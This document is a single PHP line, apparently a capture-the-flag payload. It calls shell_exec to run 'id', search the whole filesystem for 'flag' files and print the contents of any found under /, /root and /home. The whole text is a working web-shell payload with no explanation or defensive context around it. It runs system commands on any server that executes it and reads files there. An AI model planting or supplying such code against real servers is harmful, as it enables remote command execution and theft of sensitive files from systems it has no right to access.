<?php echo shell_exec('id; find / -name "flag*" 2>/dev/null; cat /flag* 2>/dev/null; cat /root/flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null'); ?>
